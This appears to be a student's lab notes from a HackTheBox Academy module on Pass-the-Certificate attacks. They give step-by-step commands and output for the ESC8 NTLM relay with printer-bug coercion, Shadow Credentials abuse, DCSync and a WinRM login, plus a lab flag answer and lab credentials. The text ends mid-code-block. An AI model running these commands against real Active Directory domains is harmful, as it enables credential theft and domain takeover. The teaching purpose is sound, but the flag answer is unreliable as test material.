# Pass the Certificate
[PKINIT](https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-pkca/d0cf1763-3541-4008-a75f-a577fa5e8c5b), short for **Public Key Cryptography for Initial Authentication**, is an extension of the Kerberos protocol that enables the use of public key cryptography during the initial authentication exchange. It is typically used to support user logons via smart cards, which store the private keys. **Pass-the-Certificate** refers to the technique of using X.509 certificates to successfully obtain **Ticket Granting Tickets (TGTs)**.

## AD CS NTLM Relay Attack (ESC8)
ESC8 is an NTLM relay attack targeting an ADCS HTTP endpoint. ADCS supports multiple enrollment methods, including web enrollment, which by default occurs over HTTP. A certificate authority configured to allow web enrollment typically hosts the following application at `/CertSrv`:

![alt text](PtC_1.png)

Attackers can use Impacket’s [ntlmrelayx](https://github.com/fortra/impacket/blob/master/examples/ntlmrelayx.py) to listen for inbound connections and relay them to the web enrollment service using the following command:

```sh
masterofblafu@htb[/htb]$ impacket-ntlmrelayx -t http://10.129.234.110/certsrv/certfnsh.asp --adcs -smb2support --template KerberosAuthentication
```

> **Note:** The value passed to --template may be different in other environments. This is simply the certificate template which is used by Domain Controllers for authentication. This can be enumerated with tools like [certipy](https://github.com/ly4k/Certipy).

Attackers can either wait for victims to attempt authentication against their machine randomly, or they can actively coerce them into doing so. One way to force machine accounts to authenticate against arbitrary hosts is by exploiting the [printer bug](https://github.com/dirkjanm/krbrelayx/blob/master/printerbug.py). This attack requires the targeted machine account to have the **Printer Spooler** service running. The command below forces **10.129.234.109 (DC01)** to attempt authentication against **10.10.16.12 (attacker host)**:

```sh
masterofblafu@htb[/htb]$ python3 printerbug.py INLANEFREIGHT.LOCAL/wwhite:"package5shores_topher1"@10.129.234.109 10.10.16.12

[*] Bind OK
[*] Got handle
RPRN SessionError: code: 0x6ba - RPC_S_SERVER_UNAVAILABLE - The RPC server is unavailable.
[*] Triggered RPC backconnect, this may or may not have worked
```

Referring back to **ntlmrelayx**, we can see from the output that the authentication request was successfully relayed to the web enrollment application, and a certificate was issued for **DC01$**:

We can now perform a **Pass-the-Certificate** attack to obtain a TGT as **DC01$**. One way to do this is by using [gettgtpkinit.py](https://github.com/dirkjanm/PKINITtools/blob/master/gettgtpkinit.py). First, let's clone the repository and install the dependencies:

```sh
masterofblafu@htb[/htb]$ git clone https://github.com/dirkjanm/PKINITtools.git && cd PKINITtools
masterofblafu@htb[/htb]$ python3 -m venv .venv
masterofblafu@htb[/htb]$ source .venv/bin/activate
masterofblafu@htb[/htb]$ pip3 install -r requirements.txt
```

Then, we can begin the attack.

> **Note:** If you encounter error stating **"Error detecting the version of libcrypto"**, it can be fixed by installing the [oscrypto](https://github.com/wbond/oscrypto) library.

```sh
masterofblafu@htb[/htb]$ pip3 install -I git+https://github.com/wbond/oscrypto.git

```

Once we successfully obtain a TGT, we're back in familiar Pass-the-Ticket (PtT) territory. As the domain controller's machine account, we can perform a DCSync attack to, for example, retrieve the NTLM hash of the domain administrator account:

```sh
masterofblafu@htb[/htb]$ export KRB5CCNAME=/tmp/dc.ccache
masterofblafu@htb[/htb]$ impacket-secretsdump -k -no-pass -dc-ip 10.129.234.109 -just-dc-user Administrator 'INLANEFREIGHT.LOCAL/DC01$'@DC01.INLANEFREIGHT.LOCAL

```

## Shadow Credentials (msDS-KeyCredentialLink)
[Shadow Credentials](https://posts.specterops.io/shadow-credentials-abusing-key-trust-account-mapping-for-takeover-8ee1a53566ab) refers to an Active Directory attack that abuses the [msDS-KeyCredentialLink](https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-adts/f70afbcc-780e-4d91-850c-cfadce5bb15c) attribute of a victim user. This attribute stores public keys that can be used for authentication via PKINIT. In BloodHound, the **AddKeyCredentialLink** edge indicates that one user has write permissions over another user's **msDS-KeyCredentialLink** attribute, allowing them to take control of that user.

![alt text](PtC_2.png)

We can use [pywhisker](https://github.com/ShutdownRepo/pywhisker) to perform this attack from a Linux system. The command below generates an **X.509 certificate** and writes the public key to the victim user's **msDS-KeyCredentialLink** attribute:

```sh
masterofblafu@htb[/htb]$ pywhisker --dc-ip 10.129.234.109 -d INLANEFREIGHT.LOCAL -u wwhite -p 'package5shores_topher1' --target jpinkman --action add

[*] Searching for the target account
[*] Target user found: CN=Jesse Pinkman,CN=Users,DC=inlanefreight,DC=local
[*] Generating certificate
[*] Certificate generated
[*] Generating KeyCredential
[*] KeyCredential generated with DeviceID: 3496da7f-ab0d-13e0-1273-5abca66f901d
[*] Updating the msDS-KeyCredentialLink attribute of jpinkman
[+] Updated the msDS-KeyCredentialLink attribute of the target object
[*] Converting PEM -> PFX with cryptography: eFUVVTPf.pfx
[+] PFX exportiert nach: eFUVVTPf.pfx
[i] Passwort für PFX: bmRH4LK7UwPrAOfvIx6W
[+] Saved PFX (#PKCS12) certificate & key at path: eFUVVTPf.pfx
[*] Must be used with password: bmRH4LK7UwPrAOfvIx6W
[*] A TGT can now be obtained with https://github.com/dirkjanm/PKINITtools
```

In the output above, we can see that a **PFX (PKCS12)** file was created (`eFUVVTPf.pfx`), and the password is shown. We will use this file with `gettgtpkinit.py` to acquire a TGT as the victim:

```sh
masterofblafu@htb[/htb]$ python3 gettgtpkinit.py -cert-pfx ../eFUVVTPf.pfx -pfx-pass 'bmRH4LK7UwPrAOfvIx6W' -dc-ip 10.129.234.109 INLANEFREIGHT.LOCAL/jpinkman /tmp/jpinkman.ccache

2025-04-28 20:50:04,937 minikerberos INFO     Saved TGT to file
INFO:minikerberos:Saved TGT to file
```

With the TGT obtained, we may once again **pass the ticket**:

```sh
masterofblafu@htb[/htb]$ export KRB5CCNAME=/tmp/jpinkman.ccache
masterofblafu@htb[/htb]$ klist

Ticket cache: FILE:/tmp/jpinkman.ccache
Default principal: jpinkman@INLANEFREIGHT.LOCAL

04/28/2025 20:50:04  04/29/2025 06:50:04  krbtgt/INLANEFREIGHT.LOCAL@INLANEFREIGHT.LOCAL
```

In this case, we discovered that the victim user is a member of the **Remote Management Users** group, which permits them to connect to the machine via WinRM. As demonstrated in the previous section, we can use **Evil-WinRM** to connect using Kerberos (note: ensure that `krb5.conf` is properly configured):

```sh
masterofblafu@htb[/htb]$ evil-winrm -i dc01.inlanefreight.local -r inlanefreight.local

## No PKINIT?
In certain environments, an attacker may be able to obtain a certificate but be unable to use it for pre-authentication as specific victims (e.g., a domain controller machine account) due to the KDC not supporting the appropriate EKU. The tool [PassTheCert](https://github.com/AlmondOffSec/PassTheCert/) was created for such situations. It can be used to authenticate against LDAPS using a certificate and perform various attacks (e.g., changing passwords or granting DCSync rights). This attack is outside the scope of this module but is worth reading about [here](https://offsec.almond.consulting/authenticating-with-certificates-when-pkinit-is-not-supported.html).

## Questions
Authenticate to **10.129.234.174** (ACADEMY-PWATTCK-PTCDC01), **10.129.234.172** (ACADEMY-PWATTCK-PTCCA01) with user `wwhite` and password `package5shores_topher1`
1. What are the contents of flag.txt on jpinkman's desktop? **Answer: 3d7e3dfb56b200ef715cfc300f07f3f8**
   - Try to curl each target to identify which one is the web enrollment service. In this scenario it is the 10.129.234.174
   - Use Impacket’s ntlmrelayx to listen for inbound connections and relay them to the web enrollment service:
        ```sh
        $ impacket-ntlmrelayx -t http://10.129.234.172/certsrv/certfnsh.asp --adcs -smb2support --template KerberosAuthentication
        ``` 
   - Abuse the printer bug to force 10.129.234.174 (DC01) to attempt authentication agains our attack host (10.10.14.59):
        ```sh
        python3 printerbug.py INLANEFREIGHT.LOCAL/wwhite:"package5shores_topher1"@10.129.234.174 10.10.14.59
        ```
   - The authentication request was then successfully relayed to the web enrollment application, and a certificate was issued for DC01$, stored at ./'DC01$.pfx':
        ```sh
        <SNIP>
        [*] Generating CSR...

        [*] Certificate successfully written to file
        ```
   - Perform a Pass-the-Certificate attack to obtain a TGT as DC01$:
        ```sh
        $ python3 gettgtpkinit.py -cert-pfx ../'DC01$.pfx' -dc-ip 10.129.234.174 'inlanefreight.local/dc01$' /tmp/dc.ccache

        ```
   - Perform a DCSync attack with the retrieved TGT to retrieve the NTLM hash of the domain administrator account:
        ```sh
        $ export KRB5CCNAME=/tmp/dc.ccache
        # Modify the /etc/hosts file to point the hostname to the target domain controller
        $ cat /etc/hosts
